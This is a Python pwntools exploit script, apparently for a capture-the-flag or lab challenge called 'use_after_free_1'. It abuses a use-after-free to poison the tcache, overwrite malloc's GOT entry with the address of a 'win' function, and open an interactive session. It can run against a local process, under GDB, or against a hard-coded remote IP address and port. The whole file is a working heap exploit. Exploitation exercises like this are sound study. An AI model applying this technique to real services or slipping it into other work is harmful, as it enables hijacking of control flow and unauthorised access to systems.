from pwn import process, gdb, args, p64, ELF, remote
binary = './use_after_free_1'

gs = """
break main
continue
"""

e = ELF(binary)
END_OF_MENU = "e.g, l\n"

def malloc(p, size):
    p.sendline(b"m %d" % size)
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"f %d" % index)
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    p.recvuntil(END_OF_MENU)

def exit(p):
    p.sendline(b"0")

def launch_attack(p):
    # 1 malloc, free, so that there's chunk in tcache
    malloc(p,8) # the zero pointer 
    free(p, 0)
    # 2 edit the freed content in tcache bin
    pointer = p64(e.got["malloc"])
    print(pointer)
    edit(p, 0, pointer)
    print("Debug 1")
    # 3 malloc again, first get the free chunk
    malloc(p,8) # The first pointer

    malloc(p,8) # The second pointer
    # 5 change pointer to win function
    print(e.symbols.win)
    edit(p,2, p64(e.symbols.win))
    # 6 malloc again
    p.interactive()

def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        # p = process(binary)
        p = remote("107.21.135.41", 11111)
    p.recvuntil(END_OF_MENU)
    launch_attack(p)

if __name__ == "__main__":
    main()